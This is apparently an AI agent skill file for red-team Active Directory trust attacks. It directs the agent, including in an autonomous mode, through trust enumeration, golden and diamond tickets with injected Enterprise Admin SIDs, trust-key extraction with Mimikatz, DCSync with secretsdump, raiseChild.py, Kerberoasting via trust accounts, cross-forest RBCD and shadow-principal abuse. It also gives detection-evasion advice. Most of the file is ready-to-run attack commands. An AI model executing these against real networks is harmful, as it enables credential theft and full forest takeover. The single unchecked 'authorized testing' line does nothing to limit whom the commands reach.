---
name: trust-attacks
description: >
  Enumerates Active Directory trust relationships and exploits them for
  cross-domain and cross-forest privilege escalation. Covers trust enumeration
  (nltest, PowerView, BloodHound), SID history injection (child domain to
  forest root via golden/diamond ticket with extra SIDs), inter-realm TGT
  forging using trust keys, cross-forest trust abuse (SID filtering bypass,
  RBCD, Kerberoasting via trust account), and PAM trust exploitation
  (shadow principals in bastion forests). Use when the user has compromised
  a child domain and wants to escalate to the parent/forest root, when trust
  relationships are discovered during enumeration, when exploring cross-forest
  attack paths, or when bastion/PAM forest infrastructure is identified.
  Triggers on: "trust attacks", "domain trust", "forest trust", "SID history",
  "child to parent", "cross-forest", "inter-realm", "trust key", "extra SID",
  "raiseChild", "PAM trust", "shadow principals", "bastion forest",
  "trust enumeration", "SID filtering", "forest root". OPSEC: medium
  (golden/diamond tickets with extra SIDs generate standard Kerberos events;
  diamond ticket is stealthier). Tools: Mimikatz, Rubeus, Impacket
  (ticketer.py, raiseChild.py, lookupsid.py), PowerView, bloodyAD, NetExec.
  Do NOT use for basic Kerberos ticket forging without trust context — use
  **kerberos-ticket-forging**. Do NOT use for ACL-based attacks within a
  single domain — use **acl-abuse**.
---

# Trust Attacks

You are helping a penetration tester enumerate and exploit Active Directory
trust relationships for cross-domain and cross-forest privilege escalation.
All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain trust types and their security implications.
  Present attack options ranked by OPSEC. Confirm before forging tickets
  or modifying shadow principals.
- **Autonomous**: Enumerate trusts, assess SID filtering and selective
  authentication, select the best escalation path, execute, and report.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [HH:MM] trust-attacks -> <target domain>` with
  trust type, attack method, and outcome.
- **Findings** -> Log successful cross-domain/forest escalation with
  source domain, target domain, technique, and resulting access level.
- **Evidence** -> Save to `engagement/evidence/` (e.g.,
  `trust-enum-output.txt`, `trust-golden-ticket.kirbi`,
  `trust-forest-secretsdump.txt`).

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check which domains/forests are already compromised
- Leverage existing credentials (krbtgt hashes, trust keys, DA access)
- Skip re-testing trusts already enumerated

After completing trust exploitation, update `engagement/state.md`:
- **Targets**: Add newly accessible domains/forests
- **Credentials**: Add trust keys, krbtgt hashes, enterprise admin tickets
- **Access**: Add cross-domain/forest footholds
- **Vulns**: `[found] SID history injection child.local -> parent.local`
- **Pivot Map**: `trust-attacks -> credential-dumping (parent domain DCSync)`

## Prerequisites

**Access required**: Domain Admin in at least one domain (for trust key
extraction and krbtgt hash). Lower-privilege paths exist for trust account
authentication.

**Kerberos authentication setup** (for enumeration and tool execution):
```bash
# Obtain TGT
getTGT.py 'DOMAIN.LOCAL/username:password' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/username.ccache

# All Impacket commands: -k -no-pass
# NetExec: --use-kcache
# bloodyAD: -k
```

**Tools**: Mimikatz, Rubeus, Impacket (ticketer.py, raiseChild.py,
lookupsid.py, secretsdump.py, psexec.py), PowerView, bloodyAD, NetExec.

## Step 1: Enumerate Trust Relationships

### Trust Discovery

```bash
# Native Windows
nltest /trusted_domains

# PowerView — all trusts with properties
Get-DomainTrust
Get-DomainTrust -Domain parent.local

# AD Module — trust properties (critical for attack viability)
Get-ADTrust -Filter * -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive

# .NET — all trusts from current domain
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# NetExec module
nxc ldap DC_IP -u 'user' -p 'pass' --use-kcache -M enum_trusts

# Impacket — enumerate SIDs in target domain
lookupsid.py -k -no-pass DOMAIN/user@DC_IP
```

### Key Properties to Assess

| Property | Impact |
|----------|--------|
| `SIDFilteringQuarantined` | If `False`, SID history injection works across trust |
| `SelectiveAuthentication` | If `True`, only explicitly allowed users can authenticate |
| `ForestTransitive` | Indicates forest-level trust (broader scope) |
| `TrustDirection` | Inbound/Outbound/Bidirectional — determines attack direction |
| `TGTDelegation` | If `True`, unconstrained delegation possible across trust |

### Cross-Domain Group Membership

```bash
# Foreign group members (users from other domains in local groups)
Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain parent.local

# Foreign users with local admin
Get-NetLocalGroupMember -ComputerName dc.parent.local
```

### Trust Type Decision Tree

```
Trust Found
├── Parent-Child (in-forest) → SID filtering NOT enforced → Step 2 (SID History)
├── Forest Trust
│   ├── SIDFilteringQuarantined = False → Step 2 (SID History cross-forest)
│   ├── SIDFilteringQuarantined = True → Step 3 (Trust Ticket) or Step 5 (enum only)
│   └── PAM trust attributes → Step 4 (Shadow Principals)
├── External Trust
│   ├── SIDFilteringQuarantined = False → Step 2 (SID History)
│   └── SIDFilteringQuarantined = True → Step 3 (Trust Ticket) + Step 5
└── One-Way Trust
    ├── Inbound (they trust us) → Step 3 (authenticate into their domain)
    └── Outbound (we trust them) → Step 5 (limited attack surface)
```

## Step 2: SID History Injection (Child -> Parent / Cross-Forest)

The primary trust escalation technique. Forge a ticket in the child domain
with the parent domain's Enterprise Admins SID (S-1-5-21-PARENT-519) in
the SID history field.

**Prerequisite**: krbtgt hash from child domain + parent domain SID.

### Obtain Domain SIDs

```bash
# Child domain SID
lookupsid.py -k -no-pass CHILD.LOCAL/user@child-dc 0

# Parent domain SID + Enterprise Admins
lookupsid.py -k -no-pass CHILD.LOCAL/user@parent-dc | grep "Enterprise Admins"
# Note the SID before -519 as the parent domain SID
```

### Golden Ticket with Extra SIDs (Mimikatz)

```powershell
# AES256 preferred — avoids RC4 detection
kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD_SID /aes256:<CHILD_KRBTGT_AES256> /sids:S-1-5-21-PARENT_SID-519 /startoffset:-10 /endin:600 /renewmax:10080 /ptt

# RC4 fallback
kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD_SID /rc4:<CHILD_KRBTGT_RC4> /sids:S-1-5-21-PARENT_SID-519 /ptt
```

Use `/startoffset`, `/endin`, `/renewmax` to match domain policy (avoid
default 10-year lifetime which is an obvious detection indicator).

### Diamond Ticket with Extra SIDs (Rubeus — Recommended for OPSEC)

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-PARENT_SID-519 /krbkey:<CHILD_KRBTGT_AES256> /nowrap /ldap
```

Diamond ticket modifies a legitimate TGT — generates matching 4768->4769
event pairs (golden ticket skips the 4768).

### Impacket ticketer.py (Linux)

```bash
# Generate ticket with extra SID
ticketer.py -nthash <CHILD_KRBTGT_NTLM> \
  -domain child.local \
  -domain-sid S-1-5-21-CHILD_SID \
  -extra-sid S-1-5-21-PARENT_SID-519 \
  Administrator

# Or with AES (preferred)
ticketer.py -aesKey <CHILD_KRBTGT_AES256> \
  -domain child.local \
  -domain-sid S-1-5-21-CHILD_SID \
  -extra-sid S-1-5-21-PARENT_SID-519 \
  Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.local/Administrator@parent-dc.parent.local
secretsdump.py -k -no-pass child.local/Administrator@parent-dc.parent.local
```

### Automated: raiseChild.py

```bash
# Full automation: extract krbtgt, get parent SID, forge ticket, authenticate
raiseChild.py -target-exec parent-dc.parent.local child.local/admin_user

# With Kerberos auth
raiseChild.py -k -no-pass -target-exec parent-dc.parent.local child.local/admin_user
```

Automatically: gets Enterprise Admins SID from parent, retrieves child
krbtgt, creates golden ticket with extra SID, authenticates to parent DC,
extracts parent admin credentials.

### PAC Validation Considerations (2025+)

Windows Server 2025 DCs with PAC signature validation in enforcement mode
(CVE-2024-26248/29056) require valid cross-realm PAC signatures. Check
registry `PacSignatureValidationLevel`:
- **Compatibility mode** (default during rollout): forged PAC accepted
- **Enforcement mode** (2025+ default): requires trust key to sign PAC

If enforcement mode is active, use trust ticket approach (Step 3) instead.

## Step 3: Inter-Realm TGT Forging (Trust Ticket)

Forge an inter-realm TGT using the trust account key. Useful when:
- You have the trust key but not the krbtgt hash
- PAC enforcement blocks SID history injection
- Attacking external/forest trusts where SID filtering is enabled

### Extract Trust Key

```powershell
# Mimikatz — dump trust keys from DC
lsadump::trust /patch
# Look for: [In] DOMAIN$ -> NTLM: <RC4>, AES256: <AES>
# Look for: [Out] DOMAIN$ -> NTLM: <RC4>, AES256: <AES>

# Alternative: DCSync the trust account
lsadump::lsa /inject /name:TARGETDOMAIN$
```

```bash
# Impacket — DCSync trust account
secretsdump.py -k -no-pass DOMAIN/admin@dc | grep '\$'
```

### Forge Inter-Realm TGT

```powershell
# Mimikatz — inter-realm TGT (referral ticket)
kerberos::golden /domain:source.local /sid:S-1-5-21-SOURCE_SID /rc4:<TRUST_RC4> /user:Administrator /service:krbtgt /target:target.local /ticket:trust.kirbi

# Request service ticket in target domain
Rubeus.exe asktgs /ticket:trust.kirbi /service:CIFS/dc.target.local /dc:dc.target.local /ptt
```

### Trust Account Authentication

```powershell
# Authenticate as the trust account itself
Rubeus.exe asktgt /user:TARGETDOMAIN$ /domain:source.local /rc4:<TRUST_RC4> /dc:dc.source.local /ptt

# Now Kerberoast in target domain
Rubeus.exe kerberoast /domain:target.local
```

```bash
# From Linux
getTGT.py -hashes :<TRUST_NTLM> source.local/TARGETDOMAIN\$
export KRB5CCNAME=TARGETDOMAIN\$.ccache

# Kerberoast via trust account
GetUserSPNs.py -k -no-pass -target-domain target.local source.local/TARGETDOMAIN\$
```

## Step 4: PAM Trust Exploitation (Shadow Principals)

PAM (Privileged Access Management) trusts use shadow security principals in
a bastion forest to manage access to production forests. Compromising the
bastion forest gives instant access to all managed forests.

**Prerequisite**: Windows Server 2016 or later. Trust with
`ForestTransitive=True` and `SIDFilteringQuarantined=False`.

### Enumerate Shadow Principals

```powershell
# Find shadow principal configuration
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | Select Name,member,msDS-ShadowPrincipalSid

# Example output:
# Name: forest-ShadowEnterpriseAdmin
# member: CN=PAMAdmin,CN=Users,DC=bastion,DC=local
# msDS-ShadowPrincipalSid: S-1-5-21-MANAGED_SID-519
```

### Exploit: Add User to Shadow Principal Group

```powershell
# Windows — add compromised user to shadow principal
Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Add @{'member'="CN=compromised_user,CN=Users,DC=bastion,DC=local"}
```

```bash
# Linux — bloodyAD (Kerberos auth)
bloodyAD --host bastion-dc -d bastion.local -k add groupMember \
  'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' \
  compromised_user
```

Result: compromised user now has Enterprise Admin rights in all managed
forests via the shadow principal SID mapping.

## Step 5: Cross-Forest Enumeration via Trust Account

When SID filtering is enabled and direct escalation is blocked, use the
trust account for reconnaissance in the target forest.

### Kerberoasting via Trust

```bash
# Authenticate as trust account
getTGT.py -hashes :<TRUST_NTLM> source.local/TARGETDOMAIN\$
export KRB5CCNAME=TARGETDOMAIN\$.ccache

# Kerberoast in target domain
GetUserSPNs.py -k -no-pass -target-domain target.local source.local/TARGETDOMAIN\$ -outputfile trust-kerberoast.txt
```

### Cross-Forest RBCD

When you control a machine account in the trusted forest and have write
access to a computer in the trusting forest:

```powershell
# 1. Set RBCD on target in trusting forest
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount OURHOST$

# 2. Request inter-realm TGT
Rubeus.exe asktgt /user:OURHOST$ /domain:our.local /rc4:<RC4> /ptt

# 3. S4U impersonation
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/victim-host.target.local /altservice:LDAP /ptt
```

### Enumerate Across Trust

```bash
# BloodHound collection across trust
bloodhound-python -u 'user' -p 'pass' -d target.local -ns TARGET_DC_IP -c All

# LDAP queries into target domain
nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --users
nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --groups
```

## Step 6: Escalate or Pivot

After successful trust exploitation:
- **Enterprise Admin in parent domain**: Route to **credential-dumping**
  (DCSync the parent domain) for complete forest compromise
- **Access to new forest**: Route to **ad-discovery** to enumerate
  the new forest from the inside
- **Service account hashes from Kerberoasting**: Route to cracking
  (hashcat 13100/18200) then **pass-the-hash**
- **Machine account control in target forest**: Route to
  **kerberos-delegation** (RBCD) for targeted escalation
- **ADCS in target domain**: Route to **adcs-template-abuse** for
  certificate-based persistence
- **Post-compromise persistence**: Route to **ad-persistence** (golden
  certificate, DCShadow, ADFS)

Update `engagement/state.md` with:
- New domain/forest access
- Trust keys extracted
- Cross-domain credentials

## Deep Reference

For edge cases, advanced trust configurations, and additional techniques:

```
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/trust-relationship.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/trust-sid-hijacking.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/trust-ticket.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/trust-pam.md
Read $RED_RUN_DOCS/public-security-references/src/windows-hardening/active-directory-methodology/sid-history-injection.md
Read $RED_RUN_DOCS/public-security-references/src/windows-hardening/active-directory-methodology/external-forest-domain-oneway-inbound.md
Read $RED_RUN_DOCS/public-security-references/src/windows-hardening/active-directory-methodology/external-forest-domain-one-way-outbound.md
```

## Troubleshooting

### SID History Injection Fails

- **SID filtering enabled**: Check `Get-ADTrust -Properties SIDFilteringQuarantined`.
  If `True` on forest trust, SID history is stripped. Use trust ticket (Step 3)
  or Kerberoasting via trust account (Step 5) instead.
- **Selective Authentication**: Check `SelectiveAuthentication` property.
  If `True`, only explicitly allowed users can authenticate across the trust.
- **PAC validation enforcement**: Windows Server 2025+ DCs may enforce PAC
  signatures. Use diamond ticket or trust ticket approach.

### Trust Key Extraction Fails

- **lsadump::trust /patch fails**: Try `lsadump::lsa /inject /name:DOMAIN$`
  or DCSync the trust account: `secretsdump.py -k -no-pass domain/admin@dc`.
- **Trust key rotated**: Trust passwords rotate every 30 days. Extract the
  current key, not a cached one.

### Cross-Forest Access Denied

- **Clock skew**: Ensure time sync between forests: `sudo ntpdate TARGET_DC`.
- **DNS resolution**: Target DC must be resolvable. Add `/etc/hosts` entries
  or configure DNS forwarding.
- **Service ticket refused**: Verify the service exists and the trust account
  has access. Try CIFS first (most permissive).

### raiseChild.py Errors

- **"Cannot find the domain"**: Ensure DNS resolution for both child and
  parent domain. Add `/etc/hosts` entries for both DCs.
- **"Access denied"**: Requires DA in the child domain. Verify with
  `nxc smb child-dc -k --use-kcache`.

### Diamond Ticket SID History

- **Rubeus diamond fails**: Ensure `/ldap` flag is included for PAC
  attribute resolution. Use `/tgtdeleg` for automatic TGT acquisition.
- **Missing /sids**: The `/sids` parameter is required for cross-domain
  escalation — without it, the ticket is valid only in the current domain.

## OPSEC Comparison

| Technique | OPSEC | Detection | Notes |
|-----------|-------|-----------|-------|
| Trust enumeration | Low | Read-only LDAP queries | Standard recon |
| Diamond ticket + extra SID | Medium | 4768+4769 pair (normal) | Best for stealth |
| Golden ticket + extra SID | Medium-High | 4769 without 4768 | Detectable pattern |
| Inter-realm TGT (trust key) | Medium | Service ticket requests from trust account | Unusual but not alarming |
| Trust account Kerberoasting | Low-Medium | 4769 events | Offline cracking |
| raiseChild.py | High | Full chain (DCSync + ticket + auth) | Automated = fast but loud |
| PAM shadow principal modification | Medium | 5136 (object modification) | Bastion forest only |
| Cross-forest RBCD | Medium | S4U2Proxy events (4769) | Requires write access |
